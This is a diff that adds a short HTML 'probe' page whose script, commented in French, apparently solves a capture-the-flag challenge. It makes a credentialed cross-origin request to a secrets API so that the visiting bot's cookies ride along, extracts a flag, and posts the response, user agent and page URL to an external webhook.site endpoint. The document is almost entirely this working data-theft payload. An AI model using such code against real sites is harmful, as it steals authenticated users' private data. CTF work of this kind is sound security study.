@@ -1,0 +1,44 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>probe</title>
+<pre id="out">loading…</pre>
+<script>
+(async () => {
+  const webhook = "https://webhook.site/7699f217-b736-4fc2-a0d7-dc471e38814d";
+  const out = document.getElementById('out');
+  function log(x){ out.textContent += (typeof x==='string'? x : JSON.stringify(x,null,2))+"\n"; }
+
+  try {
+    const r = await fetch("https://api.takedown.cyxo.re/secrets", {
+      credentials: "include",            // <-- envoie les cookies *.cyxo.re du bot
+      mode: "cors"                        // CORS supposé permissif dans le challenge
+    });
+    const txt = await r.text();
+    log("GET /secrets -> " + r.status);
+    log(txt);
+
+    // Tente d’extraire Star{...}
+    let flag = null;
+    const m = txt.match(/Star\{[^}]+\}/);
+    if (m) flag = m[0];
+
+    // Exfil vers le webhook
+    await fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        when: new Date().toISOString(),
+        from: location.href,
+        ua: navigator.userAgent,
+        status: r.status,
+        text: txt,
+        flag
+      })
+    });
+
+    out.textContent = "OK.\n" + (flag ? ("FLAG: " + flag + "\n") : "Flag non parsé (voir webhook).");
+  } catch (e) {
+    out.textContent = "ERR: " + e;
+  }
+})();
+</script>
